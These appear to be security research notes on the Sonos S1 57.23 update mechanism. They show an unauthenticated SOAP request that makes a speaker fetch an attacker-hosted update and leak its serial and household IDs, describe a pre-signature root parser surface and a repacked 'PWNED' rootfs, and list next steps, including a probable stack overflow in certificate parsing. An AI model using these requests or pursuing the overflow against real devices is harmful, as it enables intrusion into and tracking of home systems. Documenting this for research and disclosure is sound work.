# Unauthenticated update feed on S1 57.23

## Primitive

`ZoneGroupTopology.BeginSoftwareUpdate` is unauthenticated and fetches any
`UpdateURL` from the LAN:

```
POST /ZoneGroupTopology/Control
SOAPACTION: "urn:schemas-upnp-org:service:ZoneGroupTopology:1#BeginSoftwareUpdate"

<u:BeginSoftwareUpdate>
  <Flags>0</Flags>
  <UpdateURL>http://192.168.4.160:8082/pwned.upd</UpdateURL>
</u:BeginSoftwareUpdate>
```

The player appends full device metadata to the URL:

```
?cmaj=57&cmin=23&cbld=74170&subm=4&rev=1&reg=1&serial=<serial>
 &sonosid=<id>&householdid=<household>
```

(It leaks the serial, Sonos ID and household ID to the URL host.)

If the URL serves an XML `.upm` manifest, the manifest is parsed; if it serves
an `.upd`, the package is fetched and parsed by the root `upgrade` process.
The parse happens before signature verification, so malformed packages are a
pre-auth, root-context parser surface. Invalid packages cause a reboot but do
not install.

## Confirmed gates

- The updater verifies a Sonos signature (`ZZ0124`) and refuses to write/flash
  an unsigned package.
- `preinstall` (section type 3) is **not executed** for an unsigned package,
  even when correctly encrypted to the model key (checked with a callback
  script and `telnetd` on 2323).
- `Flags` 0..31 plus 256/4096/65536/2^31/2^32-1 and `ExtraOptions` guesses
  (`bForceUpdate=1`, `force=1`, `-X`, `-Y`, ...) did not bypass the gate.
- A signed 34.16 downgrade is fetched and attempted but does not stick
  (`MinCompatibleVersion` 56.0).

## Repacking the rootfs

The kernel only supports squashfs 3.0. `mksquashfs` 3.4 (from
`squashfs3.4.tar.gz`) works in a Debian container after:

```
CFLAGS="-I. -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE -D_GNU_SOURCE -O2 \
 -std=gnu89 -fgnu89-inline -fcommon -include sys/sysmacros.h"
make mksquashfs
```

Command used:

```
mksquashfs /src /out/rootfs.bin -be -all-root -noappend -b 65536
```

Two build gotchas found 2026-10-24 (recipe above otherwise works unchanged in `debian:12` amd64):

- the Makefile is at `squashfs3.4/squashfs-tools/Makefile` and uses `CFLAGS :=`, so exporting CFLAGS is not
  enough. Pass it on the make command line (`make CFLAGS="..." mksquashfs`); an environment-only CFLAGS is
  overridden and the build dies with `undefined reference to add_dir_entry` from gnu17 inline semantics.
- **`unsquashfs` 3.4 has no `-be`** (that flag is mksquashfs-only and the usage text does not list it). It
  auto-detects endianness from the `sqsh` magic, so `unsquashfs -d <dir> <image>` unpacks a big-endian
  image directly.

Output is version 3.1; patching the minor field at offset 0x1e to 0 produces a
v3.0-identical superblock and an exact original-size image. `VERSION` was
patched to `57.23-PWNED`; see `patched-rootfs.bin` and `pwned.upd`.

Encryption is the standard component envelope (`886499ca`, then
`u16 recipient_len`, recipient, `u32 cipher_id=1`, `u32 rsa_len`, RSA-OAEP
(SHA-1) key, `u32 cipher_id=1`, `u32 data_len`, IV+ciphertext). Section flags
must include 0x4. Existing signature section (type 22) can be kept unchanged;
the signature will not validate.

## Next

1. Recover or reproduce the Sonos update signing key. The signature section
   (type 22) is TLV with a certificate bundle, parsed by `ZZ0121`; verification
   is `ZZ0124`. `/etc/upgradekey.pub` is a 2048-bit key but signatures in the
   section are 128 bytes, so the verifier key is separate and likely 1024-bit.
2. Fuzz `ZZ0121`: cert records are parsed into a fixed stack struct
   (`0x22c0`, max 2 certs, stride `0x910`) with copies up to `0x7ff` and
   `0x100` bytes. Two maximal cert records may exceed the caller frame by
   ~0x1b8 bytes.
3. Only after a valid signature: the patched rootfs should install and expose
   `57.23-PWNED`.
